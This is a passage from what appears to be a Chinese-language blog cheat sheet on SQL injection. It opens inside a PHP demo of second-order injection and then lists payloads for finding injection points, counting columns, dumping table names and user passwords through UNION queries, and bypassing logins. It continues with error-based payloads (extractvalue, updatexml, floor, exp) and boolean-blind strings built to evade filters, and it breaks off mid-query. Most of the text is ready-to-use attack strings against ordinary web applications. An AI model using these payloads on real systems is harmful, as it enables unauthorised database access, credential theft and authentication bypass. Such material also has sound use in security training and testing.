class="hljs-string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tid&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$tid</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tid&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())&#123;<br>        <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$title</span>);<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO news(tid,title,content) VALUES (<span class="hljs-subst">$tid</span>,&#x27;<span class="hljs-subst">$title</span>&#x27;,&#x27;<span class="hljs-subst">$content</span>&#x27;)&quot;</span>;<br>    <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where tid=<span class="hljs-subst">$tid</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$results</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$conn</span>);<br>    <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$results</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;tid&#x27;</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;tid&#x27;</span>];<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$title</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-variable">$results</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$conn</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$results</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;title&#x27;</span>].<span class="hljs-string">&#x27;    &#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Try create a new&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/secondaryinjection.php?tid=6&amp;title=aaa%27 union select 1,user(),3%23&amp;content=qqqqq</code></p><p><code>http://127.0.0.1/secondaryinjection.php</code></p><h3 id="检测判断sql注入："><a href="#检测判断sql注入：" class="headerlink" title="检测判断sql注入："></a>检测判断sql注入：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=0 //报错</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>正确<br></code></pre></td></tr></table></figure><h3 id="判断什么类型注入："><a href="#判断什么类型注入：" class="headerlink" title="判断什么类型注入："></a>判断什么类型注入：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">id=1&quot;</span><br></code></pre></td></tr></table></figure><p>可加 “\” 等符号，构造报错，从报错回显中观察是什么类型的错误，如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;our input&#x27;</span><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>our input<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>(<span class="hljs-string">&#x27;out input&#x27;</span>)<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>(&quot;our input&quot;)<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/12S2uT.png" alt="12S2uT.png"></p><p>原理如上</p><h3 id="数据库查询版本"><a href="#数据库查询版本" class="headerlink" title="数据库查询版本"></a>数据库查询版本</h3><ul><li>Mssql: select @@version</li><li>Mysql: select version（）&#x2F;select @@version</li><li>oracle: select banner from ￥version</li><li>Postgresql: select version（）</li></ul><h3 id="判断过滤了哪些字符？"><a href="#判断过滤了哪些字符？" class="headerlink" title="判断过滤了哪些字符？"></a>判断过滤了哪些字符？</h3><p>采用异或注入。<br>在id&#x3D;1后面输入 ‘(0)’<br>发现不出错，那就将0换成1&#x3D;1<br>如果出错，那就是成功了</p><p>如果括号里面的判断是假的，那么页面就会显示正确<br>那么同理，<br>如果修改里面的内容为length(‘union’)!&#x3D;0<br>如果页面显示正确，那就证明length(‘union’)&#x3D;&#x3D;0的，也就是union被过滤了</p><h3 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h3><ul><li>order by 数字 可以判断字段的个数</li><li>也可以用猜字段 union select 1，2，3</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br>...<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by n</span><br></code></pre></td></tr></table></figure><p>如果n出现了错误那么共有n-1列，union查询必须列数量对齐，也就是说union select 1,2,…,n-1 from …</p><h3 id="判断字段回显位置"><a href="#判断字段回显位置" class="headerlink" title="判断字段回显位置"></a>判断字段回显位置</h3><p>在链接后面添加语句<code>union select 1,2,3,4,5,6,7,8,9,10,11#</code>进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。</p><h3 id="判断数据库注入"><a href="#判断数据库注入" class="headerlink" title="判断数据库注入"></a>判断数据库注入</h3><p>利用内置函数暴数据库信息<br>version()版本；database()数据库；user()用户；<br>不用猜解可用字段暴数据库信息(有些网站不适用):</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> version()<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> database()<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br>操作系统信息：<span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@global</span>.version_compile_os <span class="hljs-keyword">from</span> mysql.user<br>数据库权限：<span class="hljs-keyword">and</span> ord(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span> 返回正常说明为root<br></code></pre></td></tr></table></figure><h3 id="绕过登陆验证"><a href="#绕过登陆验证" class="headerlink" title="绕过登陆验证"></a>绕过登陆验证</h3><ul><li>admin’ –</li><li>admin’ #</li><li>admin’&#x2F;*</li><li>’ or 1&#x3D;1–</li><li>’ or 1&#x3D;1#</li><li>’ or 1&#x3D;1&#x2F;*</li><li>‘) or ‘1’&#x3D;’1–</li><li>‘) or (‘1’&#x3D;’1–</li></ul><h3 id="SQL注入常见函数"><a href="#SQL注入常见函数" class="headerlink" title="SQL注入常见函数"></a>SQL注入常见函数</h3><ul><li>group_concat函数 可以把查询的内容组合成一个字符串</li><li>load_file(file name ) 读取文件并将文件按字符串返回</li><li>left（string，length）返回最左边指定的字符数：</li><li>left（database（），1）&gt;‘s’ (猜名字)</li><li>length（）判断长度</li><li>length（database（）&gt;5</li><li>substr（a，b，c）从字符串a中截取 b到c长度</li><li>ascii（）将某个字符转为ascii值</li><li>ascii（substr（user（），1，1））&#x3D;101#</li><li>mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）</li></ul><h3 id="联合爆库："><a href="#联合爆库：" class="headerlink" title="联合爆库："></a>联合爆库：</h3><p>这里假设有3列：</p><p>为了让联合注入工作，首先要知道数据库中的表名，键入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ //--+是把语句闭合后注释掉后面的语句</span><br></code></pre></td></tr></table></figure><p>有时程序可能不会打印出所有的行，这时我们就得使用关键字limit一条条进行查询，键入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 --+</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,table_name,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>或者可以用group_concat():</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></code></pre></td></tr></table></figure><p>假设有’users’表</p><p>现在看其中的一个表，为了提取其信息，键入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>注意，我们使用’column’替换了’table’，因为我们想要的是一个表的列信息<br>假设有’username’，’password’，’flag’列，我们可以键入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(username),3 from users --+</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,flag,3 from users --+</span><br></code></pre></td></tr></table></figure><p>即可按需查询所需要的信息。</p><h3 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span> floor （<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()可修改）<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">OR</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">8627</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>),CONCAT(<span class="hljs-number">0x70307e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e7030</span>,<span class="hljs-built_in">FLOOR</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x)a)–<span class="hljs-operator">+</span><br>  <br><span class="hljs-operator">-</span> ExtractValue(有长度限制,最长<span class="hljs-number">32</span>位) （<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>可修改）<br>  <br>  <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>))–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> UpdateXml(有长度限制,最长<span class="hljs-number">32</span>位) （<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>可修改）<br><br>  <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> NAME_CONST(适用于低版本，不太好用)<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> Error based <span class="hljs-keyword">Double</span> Query Injection<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat_ws(<span class="hljs-number">0x7e</span>,version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) <span class="hljs-keyword">having</span> <span class="hljs-built_in">min</span>(<span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> <span class="hljs-built_in">exp</span>(<span class="hljs-number">5.5</span><span class="hljs-number">.5</span>以上) （<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()可修改）<br><br><span class="hljs-operator">-</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)))–<span class="hljs-operator">+</span><br><br><span class="hljs-operator">-</span> <span class="hljs-built_in">floor</span>(Mysql): <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-keyword">user</span>(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <br><span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a);<br><br><span class="hljs-operator">-</span> Extractvalue(Mysql): <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)));<br><br><span class="hljs-operator">-</span> Updatexml(Mysql): <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br><br><span class="hljs-operator">-</span> EXP: <span class="hljs-keyword">and</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br><br><span class="hljs-operator">-</span> UTL INADDR. <span class="hljs-keyword">get</span> host address(Oracle): <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>utl inaddrget host address(<span class="hljs-keyword">select</span> bannerO <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>))<br><br><span class="hljs-operator">-</span> multipoint(Mysql)：<span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> polygon(Mysql)：<span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> multipolygon(Mysql)：<span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <br><span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> linestring(Mysql)：<span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br><br><span class="hljs-operator">-</span> multilinestring(Mysql)：<span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));<br></code></pre></td></tr></table></figure><h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><ul><li><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p></li><li><h5 id="布尔条件构造"><a href="#布尔条件构造" class="headerlink" title="布尔条件构造"></a>布尔条件构造</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>正常情况<br> <span class="hljs-string">&#x27;or bool#</span><br><span class="hljs-string"> true&#x27;</span><span class="hljs-keyword">and</span> bool#<br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>不使用空格、注释<br> <span class="hljs-string">&#x27;or(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-literal">true</span><span class="hljs-string">&#x27;and(bool)=&#x27;</span><span class="hljs-number">1</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>不使用<span class="hljs-keyword">or</span>、<span class="hljs-keyword">and</span>、注释<br> <span class="hljs-string">&#x27;^!(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-string">&#x27;=(bool)=&#x27;</span><br> <span class="hljs-string">&#x27;||(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-literal">true</span><span class="hljs-string">&#x27;%26%26(bool)=&#x27;</span><span class="hljs-number">1</span><br> <span class="hljs-string">&#x27;=if((bool),1,0)=&#x27;</span><span class="hljs-number">0</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>不使用等号、空格、注释<br> <span class="hljs-string">&#x27;or(bool)&lt;&gt;&#x27;</span><span class="hljs-number">0</span><br> <span class="hljs-string">&#x27;or((bool)in(1))or&#x27;</span><span class="hljs-number">0</span><br>     <br> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>其他<br> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (bool) <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>)<br></code></pre></td></tr></table></figure></li><li><p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or (bool) or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27; and (bool) or 1=1 and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><h5 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h5><ul><li><p>逻辑判断基本就那些函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span>  <br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span> <br>    <br><span class="hljs-comment">//不使用逗号 </span><br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span> regexp <span class="hljs-string">&#x27;^[a-z]&#x27;</span><br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span> like <span class="hljs-string">&#x27;root%&#x27;</span><br><span class="hljs-function"><span class="hljs-title">POSITION</span><span class="hljs-params">(<span class="hljs-string">&#x27;root&#x27;</span> in user()</span></span>)<br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span> from <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span> from <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><h5 id="利用order-by盲注"><a href="#利用order-by盲注" class="headerlink" title="利用order by盲注"></a>利用order by盲注</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> 